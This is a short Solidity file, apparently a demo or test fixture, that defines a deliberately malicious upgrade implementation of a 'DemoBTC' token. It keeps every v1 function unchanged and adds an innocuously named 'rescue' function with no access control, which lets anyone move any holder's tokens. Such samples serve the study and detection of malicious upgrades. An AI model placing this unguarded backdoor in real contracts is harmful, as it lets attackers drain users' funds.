// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {DemoBTC} from "../DemoBTC.sol";

/// @title EvilDrainImpl (demo attack: third-party drain)
/// @notice Same storage layout and every selector of DemoBTC v1 unchanged (mint stays owner-only, transfers
///         conserve, the owner stays put), plus an innocent-sounding `rescue(from, to, amount)` with no access
///         control: anyone can move any holder's tokens to any address, without an allowance. Total supply, the
///         owner and every v1 code path are untouched, so only a probe of the new selector shows the drain.
/// @dev Deliberately malicious demo code. Never deploy outside a demo.
contract EvilDrainImpl is DemoBTC {
    function rescue(address from, address to, uint256 amount) external {
        _transfer(from, to, amount);
    }
}
